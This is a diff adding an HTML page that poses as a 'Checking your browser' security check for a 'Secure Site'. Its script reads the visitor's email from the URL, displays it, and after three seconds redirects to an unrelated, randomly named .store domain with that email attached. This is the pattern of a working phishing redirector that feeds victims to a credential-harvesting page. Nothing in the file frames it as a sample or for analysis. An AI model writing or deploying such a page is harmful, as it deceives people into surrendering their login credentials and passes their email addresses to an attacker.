@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accessing Secure Site</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            position: absolute;
+            bottom: 20px;
+            font-size: 16px;
+            color: #333;
+            text-align: center;
+        }
+        .icon {
+            font-size: 50px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .main-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .subtext {
+            font-size: 16px;
+            color: #333;
+        }
+        .email-display {
+            font-size: 14px;
+            color: #555;
+            margin-top: 15px;
+        }
+    </style>
+    <script>
+        // Function to get URL parameter by name
+        function getParameterByName(name) {
+            const url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            const regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Display the email if present in the URL
+        window.onload = function() {
+            const email = getParameterByName('email');
+            if (email) {
+                document.getElementById('emailDisplay').textContent = `Email: ${email}`;
+            }
+            
+            // Redirect after a short delay, including the email if present
+            setTimeout(function() {
+                const baseUrl = "https://tvrcemeheff.consultantmarketinglee.store/iOBZUmbP#";
+                window.location.href = email ? `${baseUrl}?email=${encodeURIComponent(email)}` : baseUrl;
+            }, 3000); // 3000 milliseconds = 3 seconds
+        };
+    </script>
+</head>
+<body>
+    <!-- Loader element -->
+    <div class="loader"></div>
+    <div class="message">
+        <div class="icon">🔒</div>
+        <div class="main-title">Accessing Secure Site</div>
+        <div class="subtext">Checking your browser...</div>
+        <div class="email-display" id="emailDisplay"></div>
+    </div>
+</body>
+</html>
